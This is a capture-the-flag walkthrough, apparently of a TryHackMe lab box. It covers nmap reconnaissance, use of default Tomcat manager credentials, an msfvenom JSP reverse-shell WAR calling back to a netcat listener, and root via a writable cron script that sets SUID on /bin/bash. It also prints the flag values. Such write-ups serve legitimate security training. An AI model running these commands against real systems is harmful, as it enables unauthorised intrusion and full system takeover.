IP - 10.48.176.251

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/OSCP/thompson]
└─$ nmap -sC -sV -A -oN nmap/initial 10.48.176.251     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 11:44 EST
Nmap scan report for 10.49.177.56
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open Ports - 22, 8009, 8080
## Exposed Credentials on Web

```URL
http://10.48.176.251:8080/
```

Host-Manager leaked creds Tomcat:s3cret
We have rights to deploy war files

### Creating Revshell War

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/thompson]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.159.0 LPORT=8000 -f war > shell.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
```
## Reverse shell to User.txt

After uploading shell.war and triggering it by click on /shell we get reverse shell.

```Bash
└─$ nc -lvnp 8000      
listening on [any] 8000 ...
connect to [192.168.159.0] from (UNKNOWN) [10.48.176.251] 45196


cd /home
ls
jack
cd jack 
ls
id.sh
test.txt
user.txt
cat user.txt
39400c90bc683a41a8935e4719f181bf

```
## Escalation of Privileges

```Bash
#root is running a cronjob
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
cat id.sh
#!/bin/bash
id > test.txt

#To get give SUID bit to id.sh to grant a priv shell on Bash
echo "chmod u+s /bin/bash" > id.sh
cat id.sh
chmod u+s /bin/bash
```
### Obtain Root.txt

```Bash
#After sometime root has executed id.sh
-rwsr-xr-x 1 root root 1014K Jul 12  2019 /bin/bash

#Now we can access privileged shell
/bin/bash -p
whoami
root
cat /root/root.txt
d89d5391984c0450a95497153ae7ca3a
```
